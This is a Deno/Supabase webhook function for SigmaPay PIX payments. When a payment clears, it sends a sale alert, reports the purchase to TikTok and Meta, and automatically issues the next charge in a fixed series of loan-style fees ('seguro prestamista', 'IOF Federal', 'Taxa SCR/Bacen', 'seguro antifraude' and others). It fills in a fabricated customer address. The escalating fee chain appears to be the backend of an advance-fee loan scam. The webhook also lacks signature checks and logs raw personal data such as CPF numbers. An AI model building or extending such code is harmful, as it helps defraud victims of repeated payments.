import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-webhook-event, x-webhook-source',
};

const SIGMAPAY_BASE_URL = 'https://api.sigmapay.com.br/api/public/v1';

const VALUE_TO_CONTENT_ID: Record<number, string> = {
  5279: 'seguro_prestamista',
  2874: 'taxa_transferencia',
  2490: 'iof_federal',
  2990: 'taxa_scr_bacen',
  3290: 'taxa_liberacao_imediata',
  3690: 'seguro_antifraude',
};

const NEXT_PAYMENT_BY_CONTENT_ID: Record<string, { contentId: string; title: string; value: number } | undefined> = {
  seguro_prestamista: { contentId: 'taxa_transferencia', title: 'Taxa de Transferência', value: 2874 },
  taxa_transferencia: { contentId: 'iof_federal', title: 'IOF Federal', value: 2490 },
  iof_federal: { contentId: 'taxa_scr_bacen', title: 'Taxa SCR/Bacen', value: 2990 },
  taxa_scr_bacen: { contentId: 'taxa_liberacao_imediata', title: 'Taxa de Liberação Imediata', value: 3290 },
  taxa_liberacao_imediata: { contentId: 'seguro_antifraude', title: 'Seguro Antifraude', value: 3690 },
};

const onlyDigits = (value: unknown) => (typeof value === 'string' ? value.replace(/\D/g, '') : '');

const normalizeStatus = (status?: string | null): string => {
  if (typeof status !== 'string') return 'created';
  const normalized = status.toLowerCase();
  if (normalized === 'waiting_payment' || normalized === 'pending') return 'created';
  if (normalized === 'refused') return 'cancelled';
  if (normalized === 'approved' || normalized === 'confirmed' || normalized === 'completed') return 'paid';
  return normalized;
};

const parseValue = (value: unknown): number | null => {
  if (typeof value === 'number' && Number.isFinite(value)) return value;
  if (typeof value === 'string') {
    const parsed = Number(value);
    return Number.isFinite(parsed) ? parsed : null;
  }
  return null;
};

const asObject = (value: unknown): Record<string, any> => (
  value && typeof value === 'object' && !Array.isArray(value)
    ? value as Record<string, any>
    : {}
);

const inferContentId = (contentId: unknown, valueCents: number | null): string | null => {
  if (typeof contentId === 'string' && contentId.length > 0) return contentId;
  if (valueCents && VALUE_TO_CONTENT_ID[valueCents]) return VALUE_TO_CONTENT_ID[valueCents];
  return null;
};

const extractTransactionHash = (body: Record<string, any>): string | null => {
  const transaction = asObject(body.transaction);
  const rawHash = body.hash || body.transaction_hash || transaction.id || (typeof body.transaction === 'string' ? body.transaction : null);
  return typeof rawHash === 'string' && rawHash.trim() ? rawHash.toLowerCase() : null;
};

const extractValueCents = (body: Record<string, any>): number | null => {
  const transaction = asObject(body.transaction);
  return parseValue(body.amount) ?? parseValue(transaction.amount) ?? null;
};

const fetchExistingNextPayment = async (
  supabaseAdmin: ReturnType<typeof createClient>,
  nextContentId: string,
  paymentRow: Record<string, any>,
) => {
  const identifiers = [
    paymentRow.customer_cpf ? { column: 'customer_cpf', value: paymentRow.customer_cpf } : null,
    paymentRow.customer_email ? { column: 'customer_email', value: paymentRow.customer_email } : null,
    paymentRow.customer_phone ? { column: 'customer_phone', value: paymentRow.customer_phone } : null,
  ].filter(Boolean) as Array<{ column: string; value: string }>;

  for (const identifier of identifiers) {
    const { data } = await supabaseAdmin
      .from('pix_payments')
      .select('transaction_id, status, content_id, created_at')
      .eq('content_id', nextContentId)
      .eq(identifier.column, identifier.value)
      .order('created_at', { ascending: false })
      .limit(1)
      .maybeSingle();

    if (data) return data;
  }

  return null;
};

const createUpsellPix = async (
  paymentRow: Record<string, any>,
  nextPayment: { contentId: string; title: string; value: number },
) => {
  const SIGMAPAY_API_TOKEN = Deno.env.get('SIGMAPAY_API_TOKEN');
  const SIGMAPAY_OFFER_HASH = Deno.env.get('SIGMAPAY_OFFER_HASH');
  const SIGMAPAY_PRODUCT_HASH = Deno.env.get('SIGMAPAY_PRODUCT_HASH');

  if (!SIGMAPAY_API_TOKEN || !SIGMAPAY_OFFER_HASH || !SIGMAPAY_PRODUCT_HASH) {
    throw new Error('SigmaPay credentials not fully configured');
  }

  const customerName = paymentRow.customer_name || paymentRow.payer_name;
  const customerEmail = paymentRow.customer_email;
  const customerPhone = onlyDigits(paymentRow.customer_phone);
  const customerCpf = onlyDigits(paymentRow.customer_cpf);

  if (!customerName || !customerEmail || customerPhone.length < 10 || customerCpf.length !== 11) {
    throw new Error('Customer data incomplete for automatic upsell generation');
  }

  const payload = {
    api_token: SIGMAPAY_API_TOKEN,
    offer_hash: SIGMAPAY_OFFER_HASH,
    payment_method: 'pix',
    installments: 1,
    amount: nextPayment.value,
    customer: {
      name: customerName,
      email: customerEmail,
      phone_number: customerPhone,
      document: customerCpf,
      street_name: 'Rua Principal',
      number: '100',
      complement: '',
      neighborhood: 'Centro',
      city: 'Sao Paulo',
      state: 'SP',
      zip_code: '01000000',
    },
    cart: [
      {
        product_hash: SIGMAPAY_PRODUCT_HASH,
        title: nextPayment.title,
        price: nextPayment.value,
        quantity: 1,
        operation_type: 1,
        tangible: false,
      },
    ],
  };

  const response = await fetch(`${SIGMAPAY_BASE_URL}/transactions`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${SIGMAPAY_API_TOKEN}`,
      'Accept': 'application/json',
    },
    body: JSON.stringify(payload),
  });

  const json = await response.json();

  if (!response.ok || !json?.hash) {
    throw new Error(json?.message || json?.error || `SigmaPay API error [${response.status}]`);
  }

  return {
    transactionId: String(json.hash).toLowerCase(),
    qrCode: json.pix?.pix_qr_code || '',
    qrCodeBase64: json.pix?.qr_code_base64 || '',
  };
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    let body: Record<string, any> = {};
    try {
      const rawText = await req.text();
      console.log('SigmaPay webhook raw payload:', rawText);
      if (rawText && rawText.trim().length > 0) {
        try {
          body = JSON.parse(rawText);
        } catch {
          body = Object.fromEntries(new URLSearchParams(rawText).entries());
        }
      }
    } catch (parseErr) {
      console.error('Failed to parse webhook body:', parseErr);
    }

    console.log('SigmaPay webhook parsed body:', JSON.stringify(body));

    const supabaseAdmin = createClient(
      Deno.env.get('SUPABASE_URL')!,
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!
    );

    const transaction = asObject(body.transaction);
    const transactionHash = extractTransactionHash(body);
    const rawStatus = (body.payment_status || body.status || transaction.status || '').toString().toLowerCase();

    if (!transactionHash) {
      console.error('No transaction hash in SigmaPay webhook payload');
      return new Response(JSON.stringify({ received: true, warning: 'missing transaction hash' }), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const { data: existingPayment } = await supabaseAdmin
      .from('pix_payments')
      .select('*')
      .eq('transaction_id', transactionHash)
      .maybeSingle();

    const normalizedStatus = normalizeStatus(rawStatus);
    const valueCents = extractValueCents(body) ?? existingPayment?.value ?? null;
    const customer = asObject(body.customer);

    try {
      const { error } = await supabaseAdmin.from('pix_payments').upsert({
        transaction_id: transactionHash,
        status: normalizedStatus || 'paid',
        payer_name: customer.name || existingPayment?.payer_name || existingPayment?.customer_name || null,
        end_to_end_id: transaction.id || (typeof body.transaction === 'string' ? body.transaction : null) || null,
        value: valueCents,
        customer_name: existingPayment?.customer_name || customer.name || null,
        customer_email: existingPayment?.customer_email || customer.email || null,
        customer_phone: existingPayment?.customer_phone || customer.phone_number || customer.phone || null,
        customer_cpf: existingPayment?.customer_cpf || customer.document || null,
        updated_at: new Date().toISOString(),
      }, { onConflict: 'transaction_id' });

      if (error) console.error('DB upsert error:', error);
      else console.log(`Payment ${transactionHash} updated to status: ${normalizedStatus}`);
    } catch (dbErr) {
      console.error('DB upsert exception:', dbErr);
    }

    const { data: paymentRow } = await supabaseAdmin
      .from('pix_payments')
      .select('*')
      .eq('transaction_id', transactionHash)
      .maybeSingle();

    if (normalizedStatus === 'paid') {
      try {
        const valueInReais = valueCents ? (valueCents / 100).toFixed(2).replace('.', ',') : '0,00';
        await fetch('https://api.pushcut.io/Ee028sYTepada_oEeEk6n/notifications/MinhaNotifica%C3%A7%C3%A3o', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            title: 'SigmaPay - Venda Paga',
            text: `Venda Aprovada 🤑\n💰 Valor: R$ ${valueInReais}`,
          }),
        });
      } catch (pushErr) {
        console.error('Pushcut notification error:', pushErr);
      }

      try {
        const currentContentId = inferContentId(paymentRow?.content_id, valueCents);
        const nextPayment = currentContentId ? NEXT_PAYMENT_BY_CONTENT_ID[currentContentId] : undefined;

        if (paymentRow && nextPayment) {
          const existingNextPayment = await fetchExistingNextPayment(supabaseAdmin, nextPayment.contentId, paymentRow);

          if (existingNextPayment) {
            console.log(`Upsell ${nextPayment.contentId} already exists for ${transactionHash}: ${existingNextPayment.transaction_id}`);
          } else {
            const generatedUpsell = await createUpsellPix(paymentRow, nextPayment);

            const { error: upsellInsertError } = await supabaseAdmin.from('pix_payments').upsert({
              transaction_id: generatedUpsell.transactionId,
              status: 'created',
              value: nextPayment.value,
              content_id: nextPayment.contentId,
              hashed_email: paymentRow.hashed_email || null,
              hashed_phone: paymentRow.hashed_phone || null,
              hashed_external_id: paymentRow.hashed_external_id || null,
              user_agent: paymentRow.user_agent || null,
              ip_address: paymentRow.ip_address || null,
              customer_name: paymentRow.customer_name || null,
              customer_email: paymentRow.customer_email || null,
              customer_phone: paymentRow.customer_phone || null,
              customer_cpf: paymentRow.customer_cpf || null,
              customer_randomized: paymentRow.customer_randomized || false,
              payer_name: paymentRow.customer_name || paymentRow.payer_name || null,
            }, { onConflict: 'transaction_id' });

            if (upsellInsertError) {
              console.error('Failed to persist automatic upsell PIX:', upsellInsertError);
            } else {
              console.log(`Automatic upsell PIX created for ${transactionHash}: ${generatedUpsell.transactionId} (${nextPayment.contentId})`);
            }
          }
        }
      } catch (upsellErr) {
        console.error('Automatic upsell generation error:', upsellErr);
      }

      try {
        const TIKTOK_ACCESS_TOKEN = Deno.env.get('TIKTOK_ACCESS_TOKEN');
        if (TIKTOK_ACCESS_TOKEN) {
          const pixelCode = 'D7FT65RC77U0PCJMQSTG';
          const valueInReaisNum = valueCents ? valueCents / 100 : 0;

          let amData: {
            hashed_email?: string | null;
            hashed_phone?: string | null;
            hashed_external_id?: string | null;
            content_id?: string | null;
            user_agent?: string | null;
            ip_address?: string | null;
          } = {};
          try {
            const { data: pixRow } = await supabaseAdmin
              .from('pix_payments')
              .select('hashed_email, hashed_phone, hashed_external_id, content_id, user_agent, ip_address')
              .eq('transaction_id', transactionHash)
              .maybeSingle();
            if (pixRow) amData = pixRow;
          } catch (lookupErr) {
            console.error('Failed to load Advanced Matching data:', lookupErr);
          }

          const contentId = inferContentId(amData.content_id, valueCents) || 'seguro_prestamista';
          const contentNameMap: Record<string, string> = {
            seguro_prestamista: 'Seguro Prestamista',
            taxa_transferencia: 'Taxa de Transferência',
            iof_federal: 'IOF Federal',
            taxa_scr_bacen: 'Taxa SCR/Bacen',
            taxa_liberacao_imediata: 'Taxa de Liberação Imediata',
            seguro_antifraude: 'Seguro Antifraude',
          };
          const contentName = contentNameMap[contentId] || 'Pagamento PIX';

          const tiktokPayload = {
            pixel_code: pixelCode,
            event: 'CompletePayment',
            event_id: `${transactionHash}_completepayment`,
            event_time: Math.floor(Date.now() / 1000),
            context: {
              user_agent: amData.user_agent || req.headers.get('user-agent') || '',
              ip: amData.ip_address || req.headers.get('x-forwarded-for') || req.headers.get('cf-connecting-ip') || '',
              user: {
                ...(amData.hashed_email ? { email: amData.hashed_email } : {}),
                ...(amData.hashed_phone ? { phone: amData.hashed_phone } : {}),
                ...(amData.hashed_external_id ? { external_id: amData.hashed_external_id } : {}),
              },
            },
            properties: {
              content_type: 'product',
              content_id: contentId,
              content_name: contentName,
              currency: 'BRL',
              value: valueInReaisNum,
              quantity: 1,
            },
          };

          const tiktokRes = await fetch('https://business-api.tiktok.com/open_api/v1.3/event/track/', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Access-Token': TIKTOK_ACCESS_TOKEN,
            },
            body: JSON.stringify({
              event_source: 'web',
              event_source_id: pixelCode,
              data: [tiktokPayload],
            }),
          });

          const tiktokData = await tiktokRes.json();
          console.log('TikTok Events API response:', JSON.stringify(tiktokData));
        } else {
          console.warn('TIKTOK_ACCESS_TOKEN not configured, skipping server-side event');
        }
      } catch (ttErr) {
        console.error('TikTok Events API error:', ttErr);
      }

      try {
        const FB_ACCESS_TOKEN = Deno.env.get('FACEBOOK_ACCESS_TOKEN');
        if (FB_ACCESS_TOKEN) {
          const FB_PIXEL_ID = '4427821890875120';
          const valueInReaisNum = valueCents ? valueCents / 100 : 0;

          let amData: {
            hashed_email?: string | null;
            hashed_phone?: string | null;
            hashed_external_id?: string | null;
            content_id?: string | null;
            user_agent?: string | null;
            ip_address?: string | null;
          } = {};
          try {
            const { data: pixRow } = await supabaseAdmin
              .from('pix_payments')
              .select('hashed_email, hashed_phone, hashed_external_id, content_id, user_agent, ip_address')
              .eq('transaction_id', transactionHash)
              .maybeSingle();
            if (pixRow) amData = pixRow;
          } catch (lookupErr) {
            console.error('Failed to load Advanced Matching data for Meta:', lookupErr);
          }

          const contentId = inferContentId(amData.content_id, valueCents) || 'seguro_prestamista';
          const contentNameMap: Record<string, string> = {
            seguro_prestamista: 'Seguro Prestamista',
            taxa_transferencia: 'Taxa de Transferência',
            iof_federal: 'IOF Federal',
            taxa_scr_bacen: 'Taxa SCR/Bacen',
            taxa_liberacao_imediata: 'Taxa de Liberação Imediata',
            seguro_antifraude: 'Seguro Antifraude',
          };
          const contentName = contentNameMap[contentId] || 'Pagamento PIX';

          const userData: Record<string, unknown> = {};
          if (amData.hashed_email) userData.em = [amData.hashed_email];
          if (amData.hashed_phone) userData.ph = [amData.hashed_phone];
          if (amData.hashed_external_id) userData.external_id = [amData.hashed_external_id];
          const clientUa = amData.user_agent || req.headers.get('user-agent') || '';
          const forwardedFor = req.headers.get('x-forwarded-for');
          const clientIp = amData.ip_address || (forwardedFor ? forwardedFor.split(',')[0].trim() : '') || req.headers.get('cf-connecting-ip') || '';
          if (clientUa) userData.client_user_agent = clientUa;
          if (clientIp) userData.client_ip_address = clientIp;

          const fbPayload = {
            data: [{
              event_name: 'Purchase',
              event_time: Math.floor(Date.now() / 1000),
              event_id: `${transactionHash}_purchase`,
              action_source: 'website',
              user_data: userData,
              custom_data: {
                currency: 'BRL',
                value: valueInReaisNum,
                content_type: 'product',
                content_ids: [contentId],
                content_name: contentName,
                num_items: 1,
              },
            }],
          };

          const fbRes = await fetch(
            `https://graph.facebook.com/v19.0/${FB_PIXEL_ID}/events?access_token=${encodeURIComponent(FB_ACCESS_TOKEN)}`,
            {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(fbPayload),
            }
          );

          const fbData = await fbRes.json();
          console.log('Meta CAPI Purchase response:', JSON.stringify(fbData));
        } else {
          console.warn('FACEBOOK_ACCESS_TOKEN not configured, skipping Meta CAPI');
        }
      } catch (fbErr) {
        console.error('Meta CAPI error:', fbErr);
      }
    }

    return new Response(JSON.stringify({ received: true }), {
      status: 200,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error) {
    console.error('SigmaPay webhook error:', error);
    return new Response(JSON.stringify({ received: true, error: (error as Error)?.message || 'Internal error' }), {
      status: 200,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
